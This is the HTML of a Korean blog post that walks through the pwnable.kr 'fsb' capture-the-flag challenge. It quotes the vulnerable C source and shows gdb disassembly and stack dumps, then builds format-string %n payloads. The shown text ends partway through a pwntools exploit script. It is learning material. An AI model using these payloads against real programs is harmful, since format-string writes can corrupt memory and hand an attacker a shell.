@@ -1,0 +1,634 @@
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>1st Problem - dowoo - Eiparyen</title>
+  <meta property="og:title" content="1st Problem - dowoo" />
+  <meta name="twitter:title" content="1st Problem - dowoo" />
+  <meta name="description" content="http://pwnable.kr - Rookiss - fsb deadline - 2018.12.18 18:00 딱봐도 문제가 format string bug.. ㅎㅎㅎ
+일단 소스코드를 보쟙 cat fsb.c !
+#include &lt;stdio.h&gt;#include &lt;alloca.h&gt;#include &lt;fcntl.h&gt; unsigned long long key; char buf[100]; char buf2[100]; int fsb(char** argv, char** envp){ char* args[]={&#34;/bin/sh&#34;, 0}; int i; char*** pargv = &amp;argv; char*** penvp = &amp;envp; char** arg; char* c; for(arg=argv;*arg;arg&#43;&#43;) for(c=*arg; *c;c&#43;&#43;) *c=&#39;\0&#39;; for(arg=envp;*arg;arg&#43;&#43;) for(c=*arg; *c;c&#43;&#43;) *c=&#39;\0&#39;; *pargv=0; *penvp=0; for(i=0; i&lt;4; i&#43;&#43;){ printf(&#34;Give me some format strings(%d)\n&#34;, i&#43;1); read(0, buf, 100); printf(buf); } printf(&#34;Wait a sec.">
+  <meta property="og:description" content="http://pwnable.kr - Rookiss - fsb deadline - 2018.12.18 18:00 딱봐도 문제가 format string bug.. ㅎㅎㅎ
+일단 소스코드를 보쟙 cat fsb.c !
+#include &lt;stdio.h&gt;#include &lt;alloca.h&gt;#include &lt;fcntl.h&gt; unsigned long long key; char buf[100]; char buf2[100]; int fsb(char** argv, char** envp){ char* args[]={&#34;/bin/sh&#34;, 0}; int i; char*** pargv = &amp;argv; char*** penvp = &amp;envp; char** arg; char* c; for(arg=argv;*arg;arg&#43;&#43;) for(c=*arg; *c;c&#43;&#43;) *c=&#39;\0&#39;; for(arg=envp;*arg;arg&#43;&#43;) for(c=*arg; *c;c&#43;&#43;) *c=&#39;\0&#39;; *pargv=0; *penvp=0; for(i=0; i&lt;4; i&#43;&#43;){ printf(&#34;Give me some format strings(%d)\n&#34;, i&#43;1); read(0, buf, 100); printf(buf); } printf(&#34;Wait a sec.">
+  <meta name="twitter:description" content="http://pwnable.kr - Rookiss - fsb deadline - 2018.12.18 18:00 딱봐도 문제가 format string bug.. ㅎㅎㅎ
+일단 소스코드를 보쟙 cat fsb.c !
+#include &lt;stdio.h&gt;#include &lt;alloca.h&gt;#include &lt;fcntl.h&gt; unsigned …"><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "Eiparyen",
+    
+    "url": "https:\/\/eiparyen.github.io"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/eiparyen.github.io"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/eiparyen.github.io",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/eiparyen.github.io\/pwnable\/2018-12-17\/",
+          "name": "1st problem dowoo"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : "arizona"
+  },
+  "headline": "1st Problem - dowoo",
+  "description" : "http:\/\/pwnable.kr - Rookiss - fsb deadline - 2018.12.18 18:00 딱봐도 문제가 format string bug.. ㅎㅎㅎ\n일단 소스코드를 보쟙 cat fsb.c !\n#include \x26lt;stdio.h\x26gt;#include \x26lt;alloca.h\x26gt;#include \x26lt;fcntl.h\x26gt; unsigned long long key; char buf[100]; char buf2[100]; int fsb(char** argv, char** envp){ char* args[]={\x26#34;\/bin\/sh\x26#34;, 0}; int i; char*** pargv = \x26amp;argv; char*** penvp = \x26amp;envp; char** arg; char* c; for(arg=argv;*arg;arg\x2b\x2b) for(c=*arg; *c;c\x2b\x2b) *c=\x26#39;\\0\x26#39;; for(arg=envp;*arg;arg\x2b\x2b) for(c=*arg; *c;c\x2b\x2b) *c=\x26#39;\\0\x26#39;; *pargv=0; *penvp=0; for(i=0; i\x26lt;4; i\x2b\x2b){ printf(\x26#34;Give me some format strings(%d)\\n\x26#34;, i\x2b1); read(0, buf, 100); printf(buf); } printf(\x26#34;Wait a sec.",
+  "inLanguage" : "en",
+  "wordCount":  823 ,
+  "datePublished" : "2018-12-13T00:00:00",
+  "dateModified" : "2018-12-13T00:00:00",
+  "image" : "https:\/\/eiparyen.github.io",
+  "keywords" : [ "pwnable" ],
+  "mainEntityOfPage" : "https:\/\/eiparyen.github.io\/pwnable\/2018-12-17\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/eiparyen.github.io",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/eiparyen.github.io",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+<meta property="og:title" content="1st Problem - dowoo" />
+<meta property="og:description" content="http://pwnable.kr - Rookiss - fsb deadline - 2018.12.18 18:00 딱봐도 문제가 format string bug.. ㅎㅎㅎ
+일단 소스코드를 보쟙 cat fsb.c !
+#include &lt;stdio.h&gt;#include &lt;alloca.h&gt;#include &lt;fcntl.h&gt; unsigned long long key; char buf[100]; char buf2[100]; int fsb(char** argv, char** envp){ char* args[]={&#34;/bin/sh&#34;, 0}; int i; char*** pargv = &amp;argv; char*** penvp = &amp;envp; char** arg; char* c; for(arg=argv;*arg;arg&#43;&#43;) for(c=*arg; *c;c&#43;&#43;) *c=&#39;\0&#39;; for(arg=envp;*arg;arg&#43;&#43;) for(c=*arg; *c;c&#43;&#43;) *c=&#39;\0&#39;; *pargv=0; *penvp=0; for(i=0; i&lt;4; i&#43;&#43;){ printf(&#34;Give me some format strings(%d)\n&#34;, i&#43;1); read(0, buf, 100); printf(buf); } printf(&#34;Wait a sec.">
+<meta property="og:url" content="https://eiparyen.github.io/pwnable/2018-12-17/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="Eiparyen" />
+  <meta name="twitter:title" content="1st Problem - dowoo" />
+  <meta name="twitter:description" content="http://pwnable.kr - Rookiss - fsb deadline - 2018.12.18 18:00 딱봐도 문제가 format string bug.. ㅎㅎㅎ
+일단 소스코드를 보쟙 cat fsb.c !
+#include &lt;stdio.h&gt;#include &lt;alloca.h&gt;#include &lt;fcntl.h&gt; unsigned …">
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:card" content="summary" />
+  <meta property="og:url" content="https://eiparyen.github.io/pwnable/2018-12-17/" />
+  <meta property="og:type" content="website" />
+  <meta property="og:site_name" content="Eiparyen" />
+
+  <meta name="generator" content="Hugo 0.54-DEV" />
+  <link rel="alternate" href="https://eiparyen.github.io/index.xml" type="application/rss+xml" title="Eiparyen">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://eiparyen.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" />
+  <link rel="stylesheet" href="https://eiparyen.github.io/css/highlight.min.css" /><link rel="stylesheet" href="https://eiparyen.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans+KR:400,700" />
+<link rel="stylesheet" href="https://eiparyen.github.io/css/custom.css" />
+
+
+
+  </head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://eiparyen.github.io">Eiparyen</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="About" href="/about/">About</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="pwnable" href="/pwnable/">pwnable</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="post-heading">
+              
+                <h1>1st Problem - dowoo</h1>
+              
+              
+              
+              
+                <span class="post-meta">
+  
+  
+  <i class="fas fa-calendar"></i>&nbsp;Posted on December 13, 2018
+  
+  
+  
+  
+    &nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;arizona
+  
+  
+</span>
+
+
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        
+
+<h3 id="http-pwnable-kr-rookiss-fsb"><a href="http://pwnable.kr" target="_blank">http://pwnable.kr</a> - Rookiss - fsb</h3>
+
+<p><span style="color:red">deadline</span>
+ - 2018.12.18 <span style="color:purple">18:00</span>
+</p>
+
+<p>딱봐도 문제가 format string bug.. ㅎㅎㅎ<br />
+일단 소스코드를 보쟙 cat fsb.c !<br></p>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;alloca.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">key</span><span class="p">;</span>
+<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+<span class="kt">char</span> <span class="n">buf2</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+
+<span class="kt">int</span> <span class="nf">fsb</span><span class="p">(</span><span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">envp</span><span class="p">){</span>
+        <span class="kt">char</span><span class="o">*</span> <span class="n">args</span><span class="p">[]</span><span class="o">=</span><span class="p">{</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">};</span>
+        <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+
+        <span class="kt">char</span><span class="o">***</span> <span class="n">pargv</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">argv</span><span class="p">;</span>
+        <span class="kt">char</span><span class="o">***</span> <span class="n">penvp</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">envp</span><span class="p">;</span>
+        <span class="kt">char</span><span class="o">**</span> <span class="n">arg</span><span class="p">;</span>
+        <span class="kt">char</span><span class="o">*</span> <span class="n">c</span><span class="p">;</span>
+        <span class="k">for</span><span class="p">(</span><span class="n">arg</span><span class="o">=</span><span class="n">argv</span><span class="p">;</span><span class="o">*</span><span class="n">arg</span><span class="p">;</span><span class="n">arg</span><span class="o">++</span><span class="p">)</span> <span class="k">for</span><span class="p">(</span><span class="n">c</span><span class="o">=*</span><span class="n">arg</span><span class="p">;</span> <span class="o">*</span><span class="n">c</span><span class="p">;</span><span class="n">c</span><span class="o">++</span><span class="p">)</span> <span class="o">*</span><span class="n">c</span><span class="o">=</span><span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+        <span class="k">for</span><span class="p">(</span><span class="n">arg</span><span class="o">=</span><span class="n">envp</span><span class="p">;</span><span class="o">*</span><span class="n">arg</span><span class="p">;</span><span class="n">arg</span><span class="o">++</span><span class="p">)</span> <span class="k">for</span><span class="p">(</span><span class="n">c</span><span class="o">=*</span><span class="n">arg</span><span class="p">;</span> <span class="o">*</span><span class="n">c</span><span class="p">;</span><span class="n">c</span><span class="o">++</span><span class="p">)</span> <span class="o">*</span><span class="n">c</span><span class="o">=</span><span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+        <span class="o">*</span><span class="n">pargv</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+        <span class="o">*</span><span class="n">penvp</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+
+        <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="mi">4</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">){</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Give me some format strings(%d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
+                <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>
+                <span class="n">printf</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Wait a sec...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+        <span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
+
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;key : </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+        <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf2</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>
+        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">pw</span> <span class="o">=</span> <span class="n">strtoull</span><span class="p">(</span><span class="n">buf2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">pw</span> <span class="o">==</span> <span class="n">key</span><span class="p">){</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Congratz!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+                <span class="n">execve</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">args</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Incorrect key </span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">**</span> <span class="n">envp</span><span class="p">){</span>
+
+        <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/urandom&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span> <span class="n">fd</span><span class="o">==-</span><span class="mi">1</span> <span class="o">||</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">8</span> <span class="p">){</span>
+                <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Error, tell admin</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+                <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+
+        <span class="n">alloca</span><span class="p">(</span><span class="mh">0x12345</span> <span class="o">&amp;</span> <span class="n">key</span><span class="p">);</span>
+
+        <span class="n">fsb</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span> <span class="c1">// exploit this format string bug!
+</span><span class="c1"></span>        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></div>
+<p>우와우 ㅎㅎㅎㅎ 아주 길당 ㅎㅎ main 첫줄부터 보즈아!<br />
+일단은..main 에서 O_RDONLY 는 읽기, O_WRONLY 는 쓰기, RDWR 는 읽기 쓰기 니깡..<br />
+<em>read only</em> 로 /dev/urandom 파일을 읽어소 .. key 라는 전역변수에 값을 8바이트 저장!
+읽기에 실패하거나.. read() 함수가 8바이트 저장을 몬한다면..(urandom 파일이 작을떄?) 에러 빼액<br />
+다음.. alloca 함수는 , malloc 과 비스무리한 함순데.. heap 말고 stack 에 할당한다구행..
+만약 buffer overflow 가 일어나면 문제가 되는 함수라.. 별로 쓰진 않는뎅!<br />
+어쩃든.. 0x12345 와 key 를 and 연산한 만큼을 stack 에 할당.. 왜있지?;;<br />
+그다음 fsb 함수를 보면.. argv(**) 라는 포인터배열, envp(**) 라는 이중포인터가 인자닷<br />
+<br>
+args(**) 란 포인터 배열에, &ldquo;/bin/sh&rdquo;(*),0 이라는.. 배열주소(*) 하나와 NULL 값을 넣어준당!
+args[0] = &ldquo;/bin/sh&rdquo;
+pargv(***) 는, args(**)의 주소고..envp 도 똑같이 하고,,for 문은
+argv[0] 부터 시작해서.. <code>**argv</code> 가 <code>'\0'</code> 이 아니라면.. **argv=argv[0][0]= &lsquo;\0&rsquo;
+쭉쭉 .해서  결국 argv 초기화! 그다음포문은 envp 초기화!
+args 라는 배열 포인터 마저 초기화! -&gt; 배열 포인터로 받았기에 가능..
+<br>
+그다음 우리의 취약한 printf(buf) 가 나온다.. 이런거 요즘 누가쓰노?ㅠㅠ
+쩃든 취약점은 허접하긴한데.. 이걸 4번이나 기회를 준다니.. 뚤릴것 같긴 한데 어떤방법이 있으까..??
+쨋든,, 코드를 마져 보면 8바이트 짜리 전역변수 key 와,  나중에 입력받을 변수 pw 가 같으면 짜잔 하고 쉘 떨어진당. 따라서 key 에 써있는 값을 컨트롤 하는게 중요하겠디!</p>
+
+<p>일단 buf 에 저장해서 그걸 printf 인자로 집어넣는 구조고.. 여기다가 %x 쓰면 고냥 *(esp+4) 값이 톡 튀어나온다는 소리다. 일단 read 이전 함수에 break 를 걸어놓고 메모리 스택을 보자.</p>
+
+<p>disas fsb 로 보면..</p>
+<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">   0x080485e7 &lt;+179&gt;:   call   0x80483f0 &lt;printf@plt&gt;
+   0x080485ec &lt;+184&gt;:   movl   <span class="nv">$0</span>x64,0x8<span class="o">(</span>%esp<span class="o">)</span>
+   0x080485f4 &lt;+192&gt;:   movl   <span class="nv">$0</span>x804a100,0x4<span class="o">(</span>%esp<span class="o">)</span>
+   0x080485fc &lt;+200&gt;:   movl   <span class="nv">$0</span>x0,<span class="o">(</span>%esp<span class="o">)</span>
+   0x08048603 &lt;+207&gt;:   call   0x80483e0 &lt;read@plt&gt;
+   0x08048608 &lt;+212&gt;:   mov    <span class="nv">$0</span>x804a100,%eax
+   0x0804860d &lt;+217&gt;:   mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
+   0x08048610 &lt;+220&gt;:   call   0x80483f0 &lt;printf@plt&gt;
+   0x08048615 &lt;+225&gt;:   addl   <span class="nv">$0</span>x1,-0x1c<span class="o">(</span>%ebp<span class="o">)</span>
+   0x08048619 &lt;+229&gt;:   cmpl   <span class="nv">$0</span>x3,-0x1c<span class="o">(</span>%ebp<span class="o">)</span></code></pre></div>
+<p>요따구 어셈블리어가 있는데.. 딱 저기 부분인거 보이제?
+그렇담 0x080485ec 에 브레이크 해놓고 보잡 b *0x080485ec</p>
+<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh"><span class="o">(</span>gdb<span class="o">)</span> x/50x <span class="nv">$esp</span>
+0xffa03aa0:     0x08048878      0x00000001      0x00000000      0x00000000
+0xffa03ab0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffa03ac0:     0x00000000      0x08048870      0x00000000      0x00000000
+0xffa03ad0:     0xffa05c48      0xffa06fe9      0xffa03af0      0xffa03af4
+0xffa03ae0:     0x00000000      0x00000000      0xffa05b48      0x08048791
+0xffa03af0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffa03b00:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffa03b10:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffa03b20:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffa03b30:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffa03b40:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffa03b50:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffa03b60:     0x00000000      0x00000000</code></pre></div>
+<p>흠.. key 의 주소를 알아보쟙</p>
+<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh"><span class="o">(</span>gdb<span class="o">)</span> p <span class="p">&amp;</span>key
+<span class="nv">$1</span> <span class="o">=</span> <span class="o">(</span>&lt;data variable, no debug info&gt; *<span class="o">)</span> 0x804a060 &lt;key&gt;</code></pre></div>
+<p>오옹이.. 여기서 그럼 0x804a60 이랑 0x804a64 이거 두부분을 덮으면 되니까.. %n 을 이용하려면,, 이 값이 메모리 어딘가에 써있어야겠네 일단.. 음??? 없잖아? ㅠㅠㅠ
+다행이도 0xffa03ad8 부분 메모리가 0ffa03af0 이야 ㅠㅠ 이런게 없으면 우짜지.. 어쨋든 있으니까 이걸 써먹어보쟈. 음 일단 그럼 0xffa03af0 부분에 0x804a060 을 써넣어야겠지?</p>
+
+<p>그렇다면,, 일단 이건 printf 의 ( esp - 0xffa03ad8 - 4 )/4 = 14 번째 페이크변수가 될태구,, 쓸 값은 0x804a060 = 134520928 이니까.. %134520928c%14$n 을 넣어주면 되겠따!!</p>
+
+<p>아까 3번쨰 printf 밑 0x08048619 에 break 를 걸어놓고 입력해보즈아 !</p>
+
+<p>앗 ㅎㅎ 근데 이거 실행할떄마다 esp 가 바껴서 조금 바꼈어 ㅎㅎㅎ 미안하다!!</p>
+<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh">0xffa79ca0:     0x0804a100      0x0804a100      0x00000064      0x00000000
+0xffa79cb0:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffa79cc0:     0x00000000      0x08048870      0x00000000      0x00000001
+0xffa79cd0:     0xffa8a038      0xffa8bfe9      0xffa79cf0      0xffa79cf4
+0xffa79ce0:     0x00000000      0x00000000      0xffa89f38      0x08048791
+0xffa79cf0:     0x0804a060      0x00000000      0x00000000      0x00000000
+0xffa79d00:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffa79d10:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffa79d20:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffa79d30:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffa79d40:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffa79d50:     0x00000000      0x00000000      0x00000000      0x00000000
+0xffa79d60:     0x00000000      0x00000000</code></pre></div>
+<p>오우 잘들어갔엉 ! 그러면 이제 key 의 앞 4바이트를 때워보자. 마찬가지로
+( esp - 0xffa79cf0 - 4 )/4 = 20 번째니까, 여기다가 0 을 넣어서 key 를 0으로 만들어버리쟝!<br />
+그러면 %20$n 을 넣으면 되것다!! 일단 넣기전 key 앞 4바이트 0x0804a060 값을 보면,</p>
+<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh"><span class="o">(</span>gdb<span class="o">)</span> p *0x0804a060
+<span class="nv">$4</span> <span class="o">=</span> -1282287952</code></pre></div>
+<p>요로코롬 돼있지? ㅎㅎ %20$n 넣어보고 다시 해보쟙!</p>
+<div class="highlight"><pre class="chroma"><code class="language-sh" data-lang="sh"><span class="o">(</span>gdb<span class="o">)</span> p *0x0804a060
+<span class="nv">$5</span> <span class="o">=</span> <span class="m">0</span></code></pre></div>
+<p>짜잔  0 됐따능 ! ㅎㅎ 밑에 4바이트도 바꿔보즈아. 당연하지만 +4 주소값이니까
+%134520932c%14$n , %20$n 을 넣어주면 되것지?ㅎㅎ gdb 말고 진짜루 해보쟝.</p>
+
+<p>파이썬으로 짜면 요따구야!</p>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="n">shell</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="s2">&#34;fsb&#34;</span><span class="p">,</span> <span class="s2">&#34;pwnable.kr&#34;</span><span class="p">,</span> <span class="n">password</span> <span class="o">=</span> <span class="s2">&#34;guest&#34;</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span> <span class="mi">2222</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">shell</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s2">&#34;/home/fsb/fsb&#34;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%134520928c</span><span class="s2">%14$n&#34;</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;%20$n&#34;</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%134520932c</span><span class="s2">%14$n&#34;</span><span class="p">)</span>
